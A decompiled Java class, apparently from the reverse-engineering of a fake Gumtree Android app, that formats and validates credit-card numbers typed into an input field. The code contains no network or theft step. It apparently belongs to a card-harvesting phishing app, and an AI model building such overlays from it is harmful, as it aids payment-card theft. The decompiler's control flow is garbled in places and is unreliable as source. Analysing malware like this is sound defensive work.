package com.gumsis.injs.g.view.watchers;

import android.text.Editable;
import android.text.InputFilter;
import android.text.InputFilter.LengthFilter;
import android.text.TextWatcher;
import android.view.View;
import android.view.View.OnFocusChangeListener;
import android.widget.EditText;
import com.gumsis.injs.g.val.CVal;
import com.gumsis.injs.g.val.models.Card;
import com.gumsis.injs.g.view._CTextInputLayout;
import java.util.ArrayList;

public abstract class CNTextWatcher
  implements TextWatcher
{
  private String currentText = "";
  private _CTextInputLayout mCTextInputLayout;
  
  protected CNTextWatcher(_CTextInputLayout param_CTextInputLayout)
  {
    this.mCTextInputLayout = param_CTextInputLayout;
    this.currentText = this.mCTextInputLayout.getEditText().getText().toString();
    this.mCTextInputLayout.getEditText().setOnFocusChangeListener(new View.OnFocusChangeListener()
    {
      public void onFocusChange(View paramAnonymousView, boolean paramAnonymousBoolean)
      {
        if ((!paramAnonymousBoolean) && (!CNTextWatcher.this.currentText.isEmpty()))
        {
          if (CNTextWatcher.this.mCTextInputLayout.hasValidInput()) {
            CNTextWatcher.this.mCTextInputLayout.setError(null);
          }
        }
        else {
          return;
        }
        CNTextWatcher.this.mCTextInputLayout.setError("Enter a valid credit card number");
      }
    });
  }
  
  private int getSpacedPanLength(int paramInt)
  {
    if (paramInt % 4 == 0) {
      return paramInt / 4 + paramInt - 1;
    }
    return paramInt / 4 + paramInt;
  }
  
  private Card setCardIcon(String paramString)
  {
    paramString = new CVal(paramString).guessCard();
    InputFilter[] arrayOfInputFilter = new InputFilter[1];
    if (paramString != null)
    {
      arrayOfInputFilter[0] = new InputFilter.LengthFilter(getSpacedPanLength(Integer.parseInt(String.valueOf(paramString.getMaxLength()))));
      onSetDrawable(paramString);
    }
    for (;;)
    {
      this.mCTextInputLayout.getEditText().setFilters(arrayOfInputFilter);
      return paramString;
      arrayOfInputFilter[0] = new InputFilter.LengthFilter(getSpacedPanLength(19));
      onSetDrawable(null);
    }
  }
  
  public void afterTextChanged(Editable paramEditable) {}
  
  public void beforeTextChanged(CharSequence paramCharSequence, int paramInt1, int paramInt2, int paramInt3) {}
  
  protected abstract void onSetDrawable(Card paramCard);
  
  public void onTextChanged(CharSequence paramCharSequence, int paramInt1, int paramInt2, int paramInt3)
  {
    Card localCard = setCardIcon(paramCharSequence.toString());
    this.mCTextInputLayout.setError(null);
    Object localObject;
    if (!paramCharSequence.toString().equals(this.currentText))
    {
      paramCharSequence = paramCharSequence.toString().replace(" ", "");
      localObject = new StringBuilder();
      paramInt1 = 0;
      while (paramInt1 < paramCharSequence.length())
      {
        if ((paramInt1 % 4 == 0) && (paramInt1 != 0)) {
          ((StringBuilder)localObject).append(" ");
        }
        ((StringBuilder)localObject).append(paramCharSequence.charAt(paramInt1));
        paramInt1 += 1;
      }
      this.currentText = ((StringBuilder)localObject).toString();
      this.mCTextInputLayout.getEditText().setText(((StringBuilder)localObject).toString());
      this.mCTextInputLayout.getEditText().setSelection(this.currentText.length());
    }
    boolean bool;
    if (localCard == null)
    {
      bool = false;
      this.mCTextInputLayout.setHasValidInput(bool);
      localObject = this.currentText;
      if (localCard != null) {
        break label245;
      }
    }
    label245:
    for (paramCharSequence = "";; paramCharSequence = localCard.getCardName())
    {
      onValidated(bool, (String)localObject, paramCharSequence);
      return;
      if (localCard.getPossibleLengths().contains(Integer.valueOf(this.currentText.replace(" ", "").length())))
      {
        bool = new CVal(this.currentText).isValidCardNumber();
        break;
      }
      bool = false;
      break;
    }
  }
  
  protected abstract void onValidated(boolean paramBoolean, String paramString1, String paramString2);
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/injs/g/view/watchers/CNTextWatcher.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */